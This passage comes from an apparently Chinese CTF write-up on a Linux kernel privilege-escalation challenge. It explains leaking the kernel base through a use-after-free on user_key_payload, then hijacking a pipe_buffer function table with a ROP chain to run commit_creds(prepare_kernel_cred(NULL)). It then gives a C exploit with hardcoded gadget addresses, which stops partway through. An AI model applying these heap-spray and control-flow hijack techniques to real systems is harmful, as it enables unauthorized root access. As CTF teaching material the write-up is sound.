plen,</span><br><span class="hljs-params">                                    <span class="hljs-type">key_serial_t</span> keyring)</span>;<br><span class="hljs-comment">//...</span><br>       <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/unistd.h&gt;</span></span><br>       <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br>       <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>       <span class="hljs-type">long</span> <span class="hljs-title function_">syscall</span><span class="hljs-params">(__NR_keyctl, <span class="hljs-type">int</span> operation, <span class="hljs-type">__kernel_ulong_t</span> arg2,</span><br><span class="hljs-params">                    <span class="hljs-type">__kernel_ulong_t</span> arg3, <span class="hljs-type">__kernel_ulong_t</span> arg4,</span><br><span class="hljs-params">                    <span class="hljs-type">__kernel_ulong_t</span> arg5)</span>;<br><br></code></pre></td></tr></table></figure>

<p>当我们调用 <code>add_key()</code> 分配一个带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时，内核会经历如下过程：</p>
<ul>
<li>首先会在内核空间中分配 obj 1 与 obj2，分配 flag 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> （字符串，最大大小为 4096）、<code>payload</code> （普通数据，大小无限制）</li>
<li>分配 obj3 保存 <code>description</code> ，分配 obj4 保存 <code>payload</code>，分配 flag 皆为 <code>GFP_KERNEL</code></li>
<li>释放 obj1 与 obj2，返回密钥 id</li>
</ul>
<p>其中 obj4 为一个 <code>user_key_payload</code> 结构体，定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_key_payload</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span>	<span class="hljs-title">rcu</span>;</span>		<span class="hljs-comment">/* RCU destructor */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>	datalen;	<span class="hljs-comment">/* length of this data */</span><br>	<span class="hljs-type">char</span>		data[] __aligned(__alignof__(u64)); <span class="hljs-comment">/* actual data */</span><br>&#125;;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">callback_head</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">callback_head</span> *<span class="hljs-title">next</span>;</span><br>	<span class="hljs-type">void</span> (*func)(<span class="hljs-keyword">struct</span> callback_head *head);<br>&#125; __attribute__((aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span> *))));<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rcu_head callback_head</span><br></code></pre></td></tr></table></figure>

<p>类似于 <code>msg_msg</code>，<code>user_key_payload</code> 结构体有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）</p>
<p> <code>keyctl()</code> 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 <code>user_key_payload-&gt;datalen</code>  决定，我们不难想到的是我们可以利用题目提供的 UAF 将<code>user_key_payload-&gt;datalen</code> 改大，从而完成越界读</p>
<p>注意以下两点：</p>
<ul>
<li>这里我们的 description 字符串需要和 payload 有着不同的长度，从而简化利用模型</li>
<li>读取 key 时的 len 应当<strong>不小于 user_key_payload-&gt;datalen，否则会读取失败</strong></li>
</ul>
<p>但是这里有一个问题：<strong>add_key() 会先分配一个临时的 obj1 拷贝 payload 后再分配一个 obj2 作为 user_key_payload</strong>，若我们先分配一个 obj 并释放后再调用 add_key() 则该 obj 不会直接成为 <code>user_key_payload</code> ，而是会在后续的数次分配中都作为拷贝 payload 的临时 obj 存在</p>
<p><strong>但我们可以通过堆喷将 UAF obj 分配到 user_key_payload</strong>，考虑如下流程：</p>
<ul>
<li>利用题目功能构建 UAF object</li>
<li>堆喷射 <code>user_key_payload</code> ，UAF obj 作为拷贝 payload 的临时 obj 存在</li>
<li><code>kmem_cache_cpu</code> 的 slub page 耗光，向 node 请求新的 slub page 分配  <code>user_key_payload</code> ，完成后 UAF obj 被释放并回到 <code>kmem_cache_node</code></li>
<li>继续堆喷 <code>user_key_payload</code> ，<code>kmem_cache_cpu</code> 的 slub page 耗光，向 node 请求新的 slub page 分配  <code>user_key_payload</code> </li>
<li>UAF obj 所在页面被取回，UAF obj 被分配为  <code>user_key_payload</code> </li>
<li>利用题目功能再次释放 UAF obj，利用题目功能进行堆喷获取到该 obj，从而覆写 <code>user_key_payload</code></li>
</ul>
<blockquote>
<p>注：官方题解中进行地址泄露也是利用类似的做法</p>
<blockquote>
<p>不过笔者觉得其实直接利用题目分配 obj1 和 obj2 后全部释放，之后再在 obj2 上弄 UAF 就行了：) 这里采用这种做法只是为了介绍 heap spraying 这一手法</p>
<blockquote>
<p>笔者将在 Step.II 中使用这种方法</p>
</blockquote>
</blockquote>
</blockquote>
<p>接下来我们考虑越界读取什么数据，这里我们并不需要分配其他的结构体， <code>rcu_head-&gt;func</code> <strong>函数指针在 rcu 对象被释放后才会被写入并调用，但调用完并不会将其置为 NULL</strong>，因此我们可以通过释放密钥的方式在内核堆上留下内核函数指针，从而完成内核基址的泄露</p>
<h4 id="Step-II-UAF-泄露可控堆对象地址，篡改-pipe-buffer-劫持控制流"><a href="#Step-II-UAF-泄露可控堆对象地址，篡改-pipe-buffer-劫持控制流" class="headerlink" title="Step.II - UAF 泄露可控堆对象地址，篡改 pipe_buffer 劫持控制流"></a>Step.II - UAF 泄露可控堆对象地址，篡改 pipe_buffer 劫持控制流</h4><p>可以用来控制内核执行流的结构体有很多，但是我们需要考虑如何完整地执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 后再成功返回用户态，因此我们需要进行栈迁移以布置较为完整的 ROP gadget chain</p>
<blockquote>
<p>什么？你问为什么不用 <code>pt_regs</code> ？因为这个手法笔者打算在后面才讲（笑）</p>
<blockquote>
<p>以及在默认开启 <code>CONFIG_RANDOMIZE_KSTACK_OFFSET</code> 的新版本内核当中这已经是时泪了（悲）</p>
</blockquote>
</blockquote>
<p>由于题目开启了 SMEP、SMAP 保护，因此我们只能在内核空间伪造函数表，同时内核中的大部分结构体的函数表为静态指定（例如 <code>tty-&gt;ops</code> 总是 <code>ptm（或pty）_unix98_ops</code>），因此我们还需要知道一个内容可控的内核对象的地址，从而在内核空间中伪造函数表</p>
<p>这里笔者选择管道相关的结构体完成利用；在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br>	<span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>	<span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>同时内核中会分配一个 <code>pipe_buffer</code> 结构体数组，每个 <code>pipe_buffer</code> 结构体对应一张用以存储数据的内存页：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>pipe_buf_operations</code> 为一张函数表，当我们对管道进行特定操作时内核便会调用该表上对应的函数，例如当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，由此我们便能控制内核执行流，从而完成提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>	<span class="hljs-comment">//...</span><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * When the contents of this pipe buffer has been completely</span><br><span class="hljs-comment">	 * consumed by a reader, -&gt;release() is called.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br></code></pre></td></tr></table></figure>

<p>那么这里我们可以利用 UAF 使得 <code>user_key_payload</code> 与 <code>pipe_inode_info</code> 占据同一个 object， <code>pipe_inode_info</code> 刚好会将 <code>user_key_payload-&gt;datalen</code> 改为 <code>0xFFFF</code> 使得我们能够继续读取数据，从而读取 <code>pipe_inode_info</code>  以泄露出 <code>pipe_buffer</code> 的地址</p>
<p>而  <code>pipe_buffer</code> 是动态分配的，因此我们可以利用题目功能预先分配一个对象作为 <code>pipe_buffer</code> 并直接在其上伪造函数表即可</p>
<blockquote>
<p>对于笔者来说比较麻烦的倒是找栈迁移的 gadget…好在最后还是成功找到了一些合适的 gadget</p>
</blockquote>
<h3 id="③-FINAL-EXPLOIT-1"><a href="#③-FINAL-EXPLOIT-1" class="headerlink" title="③ FINAL EXPLOIT"></a>③ FINAL EXPLOIT</h3><p>最后的 exp 如下，这种解法<strong>不需要出题人主动关闭一些保护来降低题目难度</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-comment">/* kmalloc-192 has only 21 objects on a slub, we don&#x27;t need to spray to many */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPRAY_NUM 40</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_INODE_INFO_SZ 192</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_BUFFER_SZ 1024</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USER_FREE_PAYLOAD_RCU 0xffffffff813d8210</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81096110</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e00ed0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250c9d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250ca4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> XCHG_RDI_RAX_DEC_STH_RET 0xffffffff81adfc70</span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> idx;<br>    <span class="hljs-type">uint32_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief allocate an object bby kmalloc(size, __GFP_ZERO | GFP_KERNEL )</span><br><span class="hljs-comment"> * __GFP_RECLAIM = __GFP_KSWAPD_RECLAIM | __GFP_DIRECT_RECLAIM </span><br><span class="hljs-comment"> * GFP_KERNEL = __GFP_RECLAIM | __GFP_IO | __GFP_FS</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @param idx </span><br><span class="hljs-comment"> * @param size </span><br><span class="hljs-comment"> * @param buf </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx, <span class="hljs-type">uint32_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br><br>    ioctl(dev_fd, <span class="hljs-number">0xDEADBEEF</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br><br>    ioctl(dev_fd, <span class="hljs-number">0xC0DECAFE</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *buf, pipe_buffer_addr;<br>    <span class="hljs-type">int</span> key_id[KEY_SPRAY_NUM], victim_key_idx = <span class="hljs-number">-1</span>, pipe_key_id;<br>    <span class="hljs-type">char</span> desciption[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> retval;<br><br>    <span class="hljs-comment">/* fundamental works */</span><br>    bindCore(<span class="hljs-number">0</span>);<br>    saveStatus();<br><br>    buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">0x4000</span>);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to open the /dev/rwctf file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* construct UAF on user_key_payload */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct UAF obj and spray keys...&quot;</span>);<br>    alloc(<span class="hljs-number">0</span>, PIPE_INODE_INFO_SZ, buf);<br>    del(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-built_in">snprintf</span>(desciption, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;%s%d&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, i);<br>        key_id[i] = key_alloc(desciption, buf, PIPE_INODE_INFO_SZ - <span class="hljs-number">0x18</span>);<br>        <span class="hljs-keyword">if</span> (key_id[i] &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d key!\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to add_key()!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    del(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* corrupt user_key_payload&#x27;s header */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] corrupting user_key_payload...&quot;</span>);<br><br>    buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    buf[<span class="hljs-number">2</span>] = <span class="hljs-number">0x2000</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (KEY_SPRAY_NUM * <span class="hljs-number">2</span>); i++) &#123;<br>        alloc(<span class="hljs-number">0</span>, PIPE_INODE_INFO_SZ, buf);<br>    &#125;<br><br>    <span class="hljs-comment">/* check for oob-read and leak kernel base */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] try to make an OOB-read...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (key_read(key_id[i], buf, <span class="hljs-number">0x4000</span>) &gt; PIPE_INODE_INFO_SZ) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] found victim key at idx: %d\n&quot;</span>, i);<br>            victim_key_idx = i;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            key_revoke(key_id[i]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_key_idx == <span class="hljs-number">-1</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED at corrupt user_key_payload!&quot;</span>);<br>    &#125;<br><br>    kernel_offset = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x2000</span> / <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (buf[i] &gt; kernel_base &amp;&amp; (buf[i] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x210</span>) &#123;<br>            kernel_offset = buf[i] - USER_FREE_PAYLOAD_RCU;<br>            kernel_base += kernel_offset;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (kernel_offset == <span class="hljs-number">-1</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to leak kernel addr!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">/* construct UAF on pipe_inode_buffer to leak pipe_buffer&#x27;s addr */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct UAF on pipe_inode_info...&quot;</span>);<br><br>    <span class="hljs-comment">/* 0-&gt;1-&gt;..., the 1 will be the payload object */</span><br>    alloc(<span class="hljs-number">0</span>, PIPE_INODE_INFO_SZ, buf);<br>    alloc(<span class="hljs-number">1</span>, PIPE_INODE_INFO_SZ, buf);<br>    del(<span class="hljs-number">1</span>);<br>    del(<span class="hljs-number">0</span>);<br><br>    pipe_key_id = key_alloc(<span class="hljs-string">&quot;arttnba3pipe&quot;</span>, buf, PIPE_INODE_INFO_SZ - <span class="hljs-number">0x18</span>);<br>    del(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* this object is for the pipe buffer */</span><br>    alloc(<span class="hljs-number">0</span>, PIPE_BUFFER_SZ, buf);<br>    del(<span class="hljs-number">0</span>);<br><br>    pipe(pipe_fd);<br><br>    <span class="hljs-comment">/* note that the user_key_payload-&gt;datalen is 0xFFFF now */</span><br>    retval = key_read(pipe_key_id, buf, <span class="hljs-number">0xffff</span>);<br>    pipe_buffer_addr = buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">/* pipe_inode_info-&gt;bufs */</span><br>    <span class="hljs-built_in">printf</span>(<span 